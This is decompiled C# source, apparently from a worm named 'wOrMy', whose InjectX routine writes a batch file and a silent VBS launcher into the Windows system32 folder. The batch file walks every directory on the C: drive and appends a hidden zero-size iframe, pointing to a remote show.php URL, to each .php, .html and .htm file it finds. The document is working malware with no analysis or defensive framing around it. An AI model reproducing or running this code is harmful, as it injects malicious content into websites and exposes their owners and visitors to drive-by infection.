using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace wOrMy;

[StandardModule]
internal sealed class InjectX
{
	public static void injectX_Sp()
	{
		//IL_0149: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (File.Exists("C:\\WINDOWS\\system32\\launch.bat"))
			{
				File.Delete("C:\\windows\\system32\\launch.bat");
				return;
			}
			FileStream stream = new FileStream("C:\\windows\\system32\\launch.bat", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter.WriteLine("@echo off & break off");
			streamWriter.WriteLine("dir /s /b /ad C:\\* >tmp");
			streamWriter.WriteLine("for /f \"delims=\" %%t in (tmp) do (");
			streamWriter.WriteLine("for %%o in (*.php) do (");
			streamWriter.WriteLine("echo ^<iframe src=\"http://www.whathaveyouchosen.com.au/modules/mod_breadcrumbs/tmpl/Config/show.php\"height=0 width=0^> >>%%o");
			streamWriter.WriteLine(")");
			streamWriter.WriteLine("for %%m in (*.html) do (");
			streamWriter.WriteLine("echo ^<iframe src=\"http://www.whathaveyouchosen.com.au/modules/mod_breadcrumbs/tmpl/Config/show.php\"height=0 width=0^> >>%%m");
			streamWriter.WriteLine(")");
			streamWriter.WriteLine("for %%y in (*.htm) do (");
			streamWriter.WriteLine("echo ^<iframe src=\"http://www.whathaveyouchosen.com.au/modules/mod_breadcrumbs/tmpl/Config/show.php\"height=0 width=0^> >>%%y");
			streamWriter.WriteLine(")");
			streamWriter.Close();
			FileStream stream2 = new FileStream("C:\\windows\\system32\\launch.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter2 = new StreamWriter(stream2);
			streamWriter2.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter2.WriteLine("Dim oShell");
			streamWriter2.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
			streamWriter2.WriteLine("oShell.run \"C:\\windows\\system32\\launch.bat\",0,True");
			streamWriter2.WriteLine("Set oShell = Nothing ");
			streamWriter2.Close();
			Process.Start("C:\\windows\\system32\\launch.vbs");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}
}
